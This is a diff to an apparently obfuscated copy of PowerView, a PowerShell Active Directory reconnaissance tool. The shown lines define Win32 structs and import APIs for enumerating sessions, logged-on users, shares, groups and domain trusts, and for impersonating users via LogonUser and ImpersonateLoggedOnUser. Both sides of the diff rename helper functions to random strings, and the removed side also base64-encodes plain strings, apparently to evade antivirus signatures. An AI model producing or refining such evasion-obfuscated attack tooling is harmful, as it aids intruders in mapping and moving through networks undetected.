-    GLOBAL_SCOPE                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMg==")))
-    DOMAIN_LOCAL_SCOPE              =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwNA==")))
-    UNIVERSAL_SCOPE                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwOA==")))
-    APP_BASIC                       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAxMA==")))
-    APP_QUERY                       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAyMA==")))
-    SECURITY                        =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg4MDAwMDAwMA==")))
+$GroupTypeEnum = twmjlt $Mod PowerView.GroupTypeEnum UInt32 @{
+    CREATED_BY_SYSTEM               =   '0x00000001'
+    GLOBAL_SCOPE                    =   '0x00000002'
+    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
+    UNIVERSAL_SCOPE                 =   '0x00000008'
+    APP_BASIC                       =   '0x00000010'
+    APP_QUERY                       =   '0x00000020'
+    SECURITY                        =   '0x80000000'
 } -Bitfield
 
 
-$UACEnum = boiwqt $Mod PowerView.UACEnum UInt32 @{
+$UACEnum = twmjlt $Mod PowerView.UACEnum UInt32 @{
     SCRIPT                          =   1
     ACCOUNTDISABLE                  =   2
     HOMEDIR_REQUIRED                =   8
@@ -12710,7 +12714,7 @@ $UACEnum = boiwqt $Mod PowerView.UACEnum UInt32 @{
 } -Bitfield
 
 
-$WTSConnectState = boiwqt $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
+$WTSConnectState = twmjlt $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
     Active       =    0
     Connected    =    1
     ConnectQuery =    2
@@ -12724,48 +12728,48 @@ $WTSConnectState = boiwqt $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
 }
 
 
-$WTS_SESSION_INFO_1 = dxxnvf $Mod PowerView.RDPSessionInfo @{
-    ExecEnvId = amckbw 0 UInt32
-    State = amckbw 1 $WTSConnectState
-    SessionId = amckbw 2 UInt32
-    pSessionName = amckbw 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    pHostName = amckbw 4 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    pUserName = amckbw 5 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    pDomainName = amckbw 6 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    pFarmName = amckbw 7 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$WTS_SESSION_INFO_1 = zxeulu $Mod PowerView.RDPSessionInfo @{
+    ExecEnvId = dmfylr 0 UInt32
+    State = dmfylr 1 $WTSConnectState
+    SessionId = dmfylr 2 UInt32
+    pSessionName = dmfylr 3 String -MarshalAs @('LPWStr')
+    pHostName = dmfylr 4 String -MarshalAs @('LPWStr')
+    pUserName = dmfylr 5 String -MarshalAs @('LPWStr')
+    pDomainName = dmfylr 6 String -MarshalAs @('LPWStr')
+    pFarmName = dmfylr 7 String -MarshalAs @('LPWStr')
 }
 
 
-$WTS_CLIENT_ADDRESS = dxxnvf $mod WTS_CLIENT_ADDRESS @{
-    AddressFamily = amckbw 0 UInt32
-    Address = amckbw 1 Byte[] -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QnlWYWxBcnJheQ=="))), 20)
+$WTS_CLIENT_ADDRESS = zxeulu $mod WTS_CLIENT_ADDRESS @{
+    AddressFamily = dmfylr 0 UInt32
+    Address = dmfylr 1 Byte[] -MarshalAs @('ByValArray', 20)
 }
 
 
-$SHARE_INFO_1 = dxxnvf $Mod PowerView.ShareInfo @{
-    Name = amckbw 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    Type = amckbw 1 UInt32
-    Remark = amckbw 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$SHARE_INFO_1 = zxeulu $Mod PowerView.ShareInfo @{
+    Name = dmfylr 0 String -MarshalAs @('LPWStr')
+    Type = dmfylr 1 UInt32
+    Remark = dmfylr 2 String -MarshalAs @('LPWStr')
 }
 
 
-$WKSTA_USER_INFO_1 = dxxnvf $Mod PowerView.LoggedOnUserInfo @{
-    UserName = amckbw 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    LogonDomain = amckbw 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    AuthDomains = amckbw 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    LogonServer = amckbw 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$WKSTA_USER_INFO_1 = zxeulu $Mod PowerView.LoggedOnUserInfo @{
+    UserName = dmfylr 0 String -MarshalAs @('LPWStr')
+    LogonDomain = dmfylr 1 String -MarshalAs @('LPWStr')
+    AuthDomains = dmfylr 2 String -MarshalAs @('LPWStr')
+    LogonServer = dmfylr 3 String -MarshalAs @('LPWStr')
 }
 
 
-$SESSION_INFO_10 = dxxnvf $Mod PowerView.SessionInfo @{
-    CName = amckbw 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    UserName = amckbw 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    Time = amckbw 2 UInt32
-    IdleTime = amckbw 3 UInt32
+$SESSION_INFO_10 = zxeulu $Mod PowerView.SessionInfo @{
+    CName = dmfylr 0 String -MarshalAs @('LPWStr')
+    UserName = dmfylr 1 String -MarshalAs @('LPWStr')
+    Time = dmfylr 2 UInt32
+    IdleTime = dmfylr 3 UInt32
 }
 
 
-$SID_NAME_USE = boiwqt $Mod SID_NAME_USE UInt16 @{
+$SID_NAME_USE = twmjlt $Mod SID_NAME_USE UInt16 @{
     SidTypeUser             = 1
     SidTypeGroup            = 2
     SidTypeDomain           = 3
@@ -12778,20 +12782,20 @@ $SID_NAME_USE = boiwqt $Mod SID_NAME_USE UInt16 @{
 }
 
 
-$LOCALGROUP_INFO_1 = dxxnvf $Mod LOCALGROUP_INFO_1 @{
-    lgrpi1_name = amckbw 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    lgrpi1_comment = amckbw 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$LOCALGROUP_INFO_1 = zxeulu $Mod LOCALGROUP_INFO_1 @{
+    lgrpi1_name = dmfylr 0 String -MarshalAs @('LPWStr')
+    lgrpi1_comment = dmfylr 1 String -MarshalAs @('LPWStr')
 }
 
 
-$LOCALGROUP_MEMBERS_INFO_2 = dxxnvf $Mod LOCALGROUP_MEMBERS_INFO_2 @{
-    lgrmi2_sid = amckbw 0 IntPtr
-    lgrmi2_sidusage = amckbw 1 $SID_NAME_USE
-    lgrmi2_domainandname = amckbw 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$LOCALGROUP_MEMBERS_INFO_2 = zxeulu $Mod LOCALGROUP_MEMBERS_INFO_2 @{
+    lgrmi2_sid = dmfylr 0 IntPtr
+    lgrmi2_sidusage = dmfylr 1 $SID_NAME_USE
+    lgrmi2_domainandname = dmfylr 2 String -MarshalAs @('LPWStr')
 }
 
 
-$DsDomainFlag = boiwqt $Mod DsDomain.Flags UInt32 @{
+$DsDomainFlag = twmjlt $Mod DsDomain.Flags UInt32 @{
     IN_FOREST       = 1
     DIRECT_OUTBOUND = 2
     TREE_ROOT       = 4
@@ -12799,13 +12803,13 @@ $DsDomainFlag = boiwqt $Mod DsDomain.Flags UInt32 @{
     NATIVE_MODE     = 16
     DIRECT_INBOUND  = 32
 } -Bitfield
-$DsDomainTrustType = boiwqt $Mod DsDomain.TrustType UInt32 @{
+$DsDomainTrustType = twmjlt $Mod DsDomain.TrustType UInt32 @{
     DOWNLEVEL   = 1
     UPLEVEL     = 2
     MIT         = 3
     DCE         = 4
 }
-$DsDomainTrustAttributes = boiwqt $Mod DsDomain.TrustAttributes UInt32 @{
+$DsDomainTrustAttributes = twmjlt $Mod DsDomain.TrustAttributes UInt32 @{
     NON_TRANSITIVE      = 1
     UPLEVEL_ONLY        = 2
     FILTER_SIDS         = 4
@@ -12816,62 +12820,62 @@ $DsDomainTrustAttributes = boiwqt $Mod DsDomain.TrustAttributes UInt32 @{
 }
 
 
-$DS_DOMAIN_TRUSTS = dxxnvf $Mod DS_DOMAIN_TRUSTS @{
-    NetbiosDomainName = amckbw 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    DnsDomainName = amckbw 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    Flags = amckbw 2 $DsDomainFlag
-    ParentIndex = amckbw 3 UInt32
-    TrustType = amckbw 4 $DsDomainTrustType
-    TrustAttributes = amckbw 5 $DsDomainTrustAttributes
-    DomainSid = amckbw 6 IntPtr
-    DomainGuid = amckbw 7 Guid
+$DS_DOMAIN_TRUSTS = zxeulu $Mod DS_DOMAIN_TRUSTS @{
+    NetbiosDomainName = dmfylr 0 String -MarshalAs @('LPWStr')
+    DnsDomainName = dmfylr 1 String -MarshalAs @('LPWStr')
+    Flags = dmfylr 2 $DsDomainFlag
+    ParentIndex = dmfylr 3 UInt32
+    TrustType = dmfylr 4 $DsDomainTrustType
+    TrustAttributes = dmfylr 5 $DsDomainTrustAttributes
+    DomainSid = dmfylr 6 IntPtr
+    DomainGuid = dmfylr 7 Guid
 }
 
 
-$NETRESOURCEW = dxxnvf $Mod NETRESOURCEW @{
-    dwScope =         amckbw 0 UInt32
-    dwType =          amckbw 1 UInt32
-    dwDisplayType =   amckbw 2 UInt32
-    dwUsage =         amckbw 3 UInt32
-    lpLocalName =     amckbw 4 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    lpRemoteName =    amckbw 5 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    lpComment =       amckbw 6 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
-    lpProvider =      amckbw 7 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
+$NETRESOURCEW = zxeulu $Mod NETRESOURCEW @{
+    dwScope =         dmfylr 0 UInt32
+    dwType =          dmfylr 1 UInt32
+    dwDisplayType =   dmfylr 2 UInt32
+    dwUsage =         dmfylr 3 UInt32
+    lpLocalName =     dmfylr 4 String -MarshalAs @('LPWStr')
+    lpRemoteName =    dmfylr 5 String -MarshalAs @('LPWStr')
+    lpComment =       dmfylr 6 String -MarshalAs @('LPWStr')
+    lpProvider =      dmfylr 7 String -MarshalAs @('LPWStr')
 }
 
 
 $FunctionDefinitions = @(
-    (mrrzbu netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
-    (mrrzbu netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
-    (mrrzbu netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
-    (mrrzbu netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
-    (mrrzbu netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
-    (mrrzbu netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
-    (mrrzbu netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
-    (mrrzbu netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
-    (mrrzbu advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
-    (mrrzbu advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
-    (mrrzbu advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
-    (mrrzbu advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
-    (mrrzbu advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
-    (mrrzbu advapi32 RevertToSelf ([Bool]) @() -SetLastError),
-    (mrrzbu wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
-    (mrrzbu wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
-    (mrrzbu wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
-    (mrrzbu wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
-    (mrrzbu wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
-    (mrrzbu wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
-    (mrrzbu Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
-    (mrrzbu Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
-    (mrrzbu kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
+    (hsvawt netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (hsvawt netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (hsvawt netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (hsvawt netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (hsvawt netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
+    (hsvawt netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
+    (hsvawt netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
+    (hsvawt netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
+    (hsvawt advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
+    (hsvawt advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
+    (hsvawt advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
+    (hsvawt advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
+    (hsvawt advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
+    (hsvawt advapi32 RevertToSelf ([Bool]) @() -SetLastError),
+    (hsvawt wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
+    (hsvawt wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
+    (hsvawt wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
+    (hsvawt wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
+    (hsvawt wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
+    (hsvawt wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
+    (hsvawt Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
+    (hsvawt Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
+    (hsvawt kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
 )
 
-$Types = $FunctionDefinitions | ilyssy -Module $Mod -Namespace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzI=")))
-$Netapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmV0YXBpMzI=")))]
-$Advapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWR2YXBpMzI=")))]
-$Wtsapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d3RzYXBpMzI=")))]
-$Mpr = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXBy")))]
-$Kernel32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzI=")))]
+$Types = $FunctionDefinitions | dpudje -Module $Mod -Namespace 'Win32'
+$Netapi32 = $Types['netapi32']
+$Advapi32 = $Types['advapi32']
+$Wtsapi32 = $Types['wtsapi32']
+$Mpr = $Types['Mpr']
+$Kernel32 = $Types['kernel32']
 
 Set-Alias Get-IPAddress Resolve-IPAddress
 Set-Alias Convert-NameToSid ConvertTo-SID
